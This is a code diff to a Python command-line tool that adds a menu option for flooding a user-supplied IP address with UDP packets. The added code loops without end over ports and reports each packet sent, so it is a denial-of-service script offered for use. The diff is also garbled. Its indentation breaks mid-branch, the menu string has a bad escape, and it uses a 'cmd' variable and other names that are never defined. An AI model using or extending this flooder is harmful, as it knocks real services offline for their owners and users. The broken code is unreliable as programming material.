@@ -23,7 +23,7 @@ while True:
 	print("    		        Github  : https://github.com/BOT-CODER")
 	print('                        Please contact us in github Page')
 	print("\033[0m","\033[92;1m")
-	print("1. Website Domain\n2. IP Addresse\n3. Exit")
+	print("1. Website Domain\n2. IP Addresse\n3. Exit\4. 1 Port")
 	opt=str(input("\nEnter Your choice: "))
 	if opt=='1':
 		domain=str(input("Enter The Website (eg:google.com):"))
@@ -34,6 +34,28 @@ while True:
 		break
 	elif opt=='3':
 		print('\033[0m')
+		exit()
+	elif opt=='4':
+		ip = input("IP Addresse  : ")
+os.system(cmd)
+print('\033[36;2mINITIALIZING....')
+for i in tqdm(range(10000)):
+	print(end='\r')
+time.sleep(4)
+print('STARTING...')
+time.sleep(4)
+sent = 0
+try:
+	while True:
+		sock.sendto(bytes, (ip,port))
+		sent=sent+1
+		print("\033[32;1mSent %s packet to %s throught port:%s"%(sent,ip,port))
+		if port==65534:
+			port=1
+		elif port==1900:
+			port=1901
+except:
+	print('\n\033[31;1mExited\nThank u for using my program \033[0m')
 		exit()
 	else:
 		print('\033[91mInvaild Choice!\033[0m')
